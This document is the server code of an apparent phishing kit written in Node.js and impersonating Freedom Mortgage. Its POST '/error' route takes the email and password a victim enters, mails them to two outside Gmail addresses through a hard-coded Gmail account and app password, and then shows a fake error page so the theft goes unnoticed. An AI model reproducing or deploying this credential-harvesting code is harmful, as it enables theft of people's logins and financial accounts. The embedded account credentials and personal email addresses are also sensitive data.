const express = require('express');
const app = express();
const bodyparser = require('body-parser');
const { dirname } = require('path');
const nodemailer = require('nodemailer');

app.use(bodyparser.urlencoded({extended:true}))
app.use(bodyparser.json())

app.use(express.static('public'));


app.use(bodyparser.urlencoded({ extended: false }));

app.listen(3000, (req, res) => {
    console.log("Server succesfully started")
})

app.get('/', (req, res) => {
    res.sendFile('/public/assets/index.html');
})


app.post('/error', (req, res) => {
    const userMail = req.body.user;
    const userpass = req.body.userpass;
 
 
    let mailTransporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'gargchitvan378@gmail.com',
            pass: 'kibjayhxzbgoskhk'
        },
        from: 'gargchitvan378@gmail.com'
    });
    
    let mailDetails = {
        // from: 'gargchitvan378@gmail.com',
        to: 'chitvangarg888@gmail.com',
        cc: 'komalgarg364@gmail.com',
        subject: 'Enquiry from Freedom Mortgage',
        text: `UserEmail : ${userMail}, password: ${userpass}`
    };
    
    mailTransporter.sendMail(mailDetails, function(err, data) {
        if(err) {
            console.log('Error Occurs', err.message);
        } else {
            console.log('Email sent successfully');
        }
    });

    res.sendFile(__dirname + '/public/error.html');

})

